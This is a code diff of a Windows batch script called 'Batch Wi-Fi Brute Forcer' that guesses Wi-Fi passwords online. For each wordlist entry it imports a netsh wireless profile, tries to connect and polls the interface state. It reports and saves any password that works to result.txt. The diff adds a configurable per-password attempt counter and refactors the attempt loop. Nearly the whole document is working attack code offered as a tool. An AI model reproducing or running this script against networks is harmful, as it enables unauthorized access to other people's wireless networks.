@@ -16,17 +16,13 @@ cls
 setlocal enabledelayedexpansion
 title Batch Wi-Fi Brute Forcer
 color 0f
+
 :: Enable UTF-8
-chcp 65001>nul
 cd /D %~dp0
 
 if not exist importwifi.xml (
-    echo.
-    call :color_echo . red "importwifi.xml is missing. Exiting..."
-    timeout /t 3 >nul
-    exit
+    call :exit_fatal "importwifi.xml is missing. Exiting..."
 )
-
 
 :: Interface Variables
 set interface_number=0
@@ -34,26 +30,21 @@ set interface_mac=not_defined
 set interface_id=not_defined
 set interface_state=not_defined
 set interface_description=not_defined
-
 set wifi_target=not_defined
 
-set wordlist_file=not_defined
+set attack_counter_option=0
 
-for /f "tokens=1" %%a in ( DefaultWordlist.txt ) do (
-   set wordlist_file=%%a
+if not exist wordlist.txt (
+    set wordlist_file=not_defined
+) else (
+    set wordlist_file=wordlist.txt
 )
 
-if "!wordlist_file!" neq "not_defined" (
-  if not exist !wordlist_file! (
-     call :wordlist
-   )
-)
 
 :program_entry
     call :interface_init
     call :mainmenu
 goto :eof
-
 
 :interface_detection
     cls
@@ -245,13 +236,19 @@ goto :eof
 
     call :program_prompt
 
+    if "!program_prompt_input!" equ "" (
+        call :program_prompt_invalid_input
+        goto :interface_selection
+    )
+
     if !program_prompt_input! leq !interface_number_zero_indexed! (
         if !program_prompt_input! geq 0 (
-
-        echo Making !interface[!program_prompt_input!]_description! the interface...
-        set interface_id=!interface[%program_prompt_input%]_id!
-        set interface_description=!interface[%program_prompt_input%]_description!
-        set interface_mac=!interface[%program_prompt_input%]_mac!
+            echo.
+            echo Making !interface[%program_prompt_input%]_description! the interface...
+            set interface_id=!interface[%program_prompt_input%]_id!
+            set interface_description=!interface[%program_prompt_input%]_description!
+            set interface_mac=!interface[%program_prompt_input%]_mac!
+            timeout /t 3 >nul
         ) else (
             if "!program_prompt_input!" equ "!cancel_index!" (
                 set interface_id=not_defined
@@ -313,6 +310,8 @@ goto :eof
     call :color_echo . white "!wordlist_file!"
     echo.
     echo.
+    echo Type 'help' for more info
+    echo.
     call :program_prompt
     echo.
 
@@ -342,16 +341,22 @@ goto :eof
         goto :mainmenu
     )
 
+    if "!program_prompt_input!" equ "counter" (
+        call :counter
+        goto :mainmenu
+    )
+
     if "!program_prompt_input!" equ "exit" (
         exit
     )
 
-call :program_prompt_invalid_input
+    call :program_prompt_invalid_input
 goto :mainmenu
 
 
 :scan
     cls
+    netsh wlan disconnect interface="%interface_id%" > nul
 
     if "!interface_id!" equ "not_defined" (
         call :color_echo . red "You have to select an interface to perform a scan"
@@ -362,7 +367,6 @@ goto :mainmenu
         goto :eof
     )
 
-
     echo.
     call :color_echo . cyan "Possible Wi-Fi Networks"
     echo.
@@ -370,7 +374,7 @@ goto :mainmenu
     :: wifi[] is the array for possible wifis
     set wifi_index=-1
     set cancel_index=0
-    for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
+    for /f "tokens=1-3,*" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
 
         if "%%a" equ "SSID" (
             set /a wifi_index=!wifi_index!+1
@@ -382,6 +386,7 @@ goto :mainmenu
         )
 
     )
+
     set /a cancel_index=!wifi_index!+1
     
     for /l %%a in ( 0, 1, !wifi_index! ) do (
@@ -393,7 +398,6 @@ goto :mainmenu
         ) else (
             call :color_echo . white "!wifi[%%a]_ssid! "
         )
-
 
         call :color_echo . blue "!wifi[%%a]_signal!"
         echo.
@@ -424,6 +428,7 @@ goto :eof
 
 :attack
 
+    set attack_finalize=false
     if "!wordlist_file!" equ "not_defined" (
         cls
         echo.
@@ -466,8 +471,11 @@ goto :eof
     echo This app might not find the correct password if the signal strength
     echo is too low. Remember, this is an online attack. Expect slow attempts.
     echo.
+    echo When an association or an authentication is detected, attack counter
+    echo is automatically increased by 5 to ensure successful connection.
+    echo.
     pause
-    netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
+    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
     cls
 
     :: Prepare ssid import
@@ -476,8 +484,11 @@ goto :eof
         set variable=%%a
         echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
     )
+
     set password_count=0
+    
     for /f "tokens=1" %%a in ( !wordlist_file! ) do (
+
         set /a password_count=!password_count!+1
         set password=%%a
 		set temp_auth_num=0
@@ -501,70 +512,117 @@ goto :eof
         echo.
         call :color_echo . cyan "Attempts: "
         echo.
-		netsh wlan connect name=!wifi_target! interface="!interface_id!" >nul
 
+        call :attack_attempt
 
-
-        for /l %%a in ( 1, 1, 20 ) do (
-            call :interface_find_state
-
-            if "!interface_state!" equ "connecting" (
-                goto :attack_success
-            )
-
-            if "!interface_state!" equ "connected" (
-                goto :attack_success
-            )
-            
-
+        if "!attack_finalize!" equ "true" (
+            set attack_finalize=false
+            goto :eof
         )
 
-        del /Q /F importwifi_attempt.xml 2>nul
     )
 
-    :attack_failure
-        del /Q /F importwifi_prepared.xml 2>nul
-        del /Q /F importwifi_attempt.xml 2>nul
-        cls
-        echo.
-        call :color_echo . red "Could not find the password"
-        echo.
-        echo.
-        netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
-        pause
-    goto :eof
-
-    :attack_success
-        del /Q /F importwifi_prepared.xml 2>nul
-        del /Q /F importwifi_attempt.xml 2>nul
-        cls
-        echo.
-        call :color_echo . green "Found the password"
-        echo.
-        echo.
-        echo.
-        call :color_echo . magenta "Target     : "
-        call :color_echo . white "!wifi_target!"
-        echo.
-        call :color_echo . magenta "Password   : "
-        call :color_echo . white "!password!"
-        echo.
-        call :color_echo . magenta "At attempt : "
-        call :color_echo . white "!password_count!"
-        echo.
-        echo.
-
-        echo Batch Wi-Fi Brute Forcer Result>>result.txt
-        echo Target     : !wifi_target!>>result.txt
-        echo At attempt : !password_count!>>result.txt
-        echo Password   : !password!>>result.txt
-        echo.>>result.txt
-        pause
-    goto :eof
-
+    call :attack_failure
 goto :eof
 
 
+:attack_failure
+    del /Q /F importwifi_prepared.xml 2>nul
+    del /Q /F importwifi_attempt.xml 2>nul
+    cls
+    echo.
+    call :color_echo . red "Could not find the password"
+    echo.
+    echo.
+    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
+    pause
+goto :eof
+
+:attack_success
+    del /Q /F importwifi_prepared.xml 2>nul
+    del /Q /F importwifi_attempt.xml 2>nul
+    cls
+    echo.
+    call :color_echo . green "Found the password"
+    echo.
+    echo.
+    echo.
+    call :color_echo . magenta "Target     : "
+    call :color_echo . white "!wifi_target!"
+    echo.
+    call :color_echo . magenta "Password   : "
+    call :color_echo . white "!password!"
+    echo.
+    call :color_echo . magenta "At attempt : "
+    call :color_echo . white "!password_count!"
+    echo.
+    echo.
+
+    echo Batch Wi-Fi Brute Forcer Result>>result.txt
+    echo Target     : !wifi_target!>>result.txt
+    echo At attempt : !password_count!>>result.txt
+    echo Password   : !password!>>result.txt
+    echo.>>result.txt
+    pause
+goto :eof
+
+:attack_attempt
+	netsh wlan connect name="!wifi_target!" interface="!interface_id!" >nul
+
+    if "%attack_counter_option%" equ "0" (
+        set attack_counter=10
+    ) else (
+        set attack_counter=!attack_counter_option!
+    )
+
+    set attack_associating_detected=false
+    set attack_authenticating_detected=false
+
+    for /l %%a in ( 1, 1, 40 ) do (
+
+        if "!attack_counter!" equ "0" (
+            del /Q /F importwifi_attempt.xml 2>nul
+            goto :eof
+        )
+
+        call :color_echo . white "Attempts Left ("
+        call :color_echo . magenta "!attack_counter!"
+        call :color_echo . white ") "
+
+        call :interface_find_state
+
+        if "!interface_state!" equ "associating" (
+            if "!attack_associating_detected!" equ "false" (
+                set /a attack_counter=!attack_counter!+5
+                set attack_associating_detected=true
+            )
+        ) 
+
+        if "!interface_state!" equ "authenticating" (
+            if "!attack_authenticating_detected!" equ "false" (
+                set /a attack_counter=!attack_counter!+5
+                set attack_authenticating_detected=true
+            )
+        ) 
+
+        if "!interface_state!" equ "connecting" (
+            del /Q /F importwifi_attempt.xml 2>nul
+            set attack_finalize=true
+            call :attack_success
+            goto :eof
+        )
+
+        if "!interface_state!" equ "connected" (
+            del /Q /F importwifi_attempt.xml 2>nul
+            set attack_finalize=true
+            call :attack_success
+            goto :eof
+        )
+        
+        set /a attack_counter=!attack_counter!-1
+    )
+
+goto :eof
 
 
 :help
@@ -574,15 +632,16 @@ goto :eof
 		echo.
 		echo.
 		echo  - help             : Displays this page
-                echo  - wordlist         : Provide a wordlist file
+        echo  - wordlist         : Provide a wordlist file
 		echo  - scan             : Performs a WI-FI scan
 		echo  - interface        : Open Interface Management
 		echo  - attack           : Attacks selected WI-FI
+        echo  - counter          : Sets the attack counter
+        echo  - exit             : Close the program
 		echo.
-		echo  For more informaton, please read "README.md".
+		echo  For more informaton, please refer to "README.md".
 		echo.
-		echo  Other projects of TUX:
-		echo  https://www.technicaluserx.wordpress.com
+		echo  More projects from TechnicalUserX:
         echo  https://github.com/TechnicalUserX
 		echo.
 		echo.
@@ -590,7 +649,6 @@ goto :eof
 		pause >nul
 
 goto :eof
-
 
 
 :wordlist
@@ -612,6 +670,29 @@ goto :eof
     )
 goto :eof
 
+:counter
+    cls
+    echo.
+    call :color_echo . cyan "Set Attempt Count"
+    echo.
+    echo.
+    echo Please provide number for per-password 
+    echo counter while attacking a network.
+    echo.
+    echo This counter will be used to query network
+    echo connection whether it is successful.
+    echo.
+    call :program_prompt
+    echo.
+    echo %program_prompt_input%| findstr /r "^[0-9]*$" >nul
+    
+    if %errorlevel% equ 0 (
+        set attack_counter_option=!program_prompt_input!
+    ) else (
+        call :color_echo . red "Provided input is not a valid number"
+        timeout /t 2 >nul
+    )
+goto :eof
 
 
 :prepare_attempt
@@ -620,7 +701,6 @@ goto :eof
 		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
     )
 goto :eof
-
 
 
 :interface_find_state
@@ -643,7 +723,7 @@ goto :eof
     )
 	:skip_find_connection_state
     if !interface_state!==associating (
-        call :color_echo . yellow "Associating..."
+        call :color_echo . yellow "Associating"
         echo.
     )
     if !interface_state!==disconnecting (
@@ -651,24 +731,27 @@ goto :eof
         echo.
     )
     if !interface_state!==disconnected (
-        call :color_echo . red "Disconnected."
+        call :color_echo . red "Disconnected"
         echo.
     )
     if !interface_state!==authenticating (
-        call :color_echo . blue "Authenticating..."
+        call :color_echo . blue "Authenticating"
         echo.
     )
     if !interface_state!==connecting (
-        call :color_echo . yellow "Connecting..."
+        call :color_echo . yellow "Connecting"
         echo.
     )
     if !interface_state!==connected (
-        call :color_echo . green "Connected."
+        call :color_echo . green "Connected"
         echo.
         timeout /t 2 /nobreak>nul
     )
+goto :eof
 
 
-
-
+:exit_fatal
+    call :color_echo . red "%~1"
+    timeout /t 3 >nul
+    exit
 goto :eof
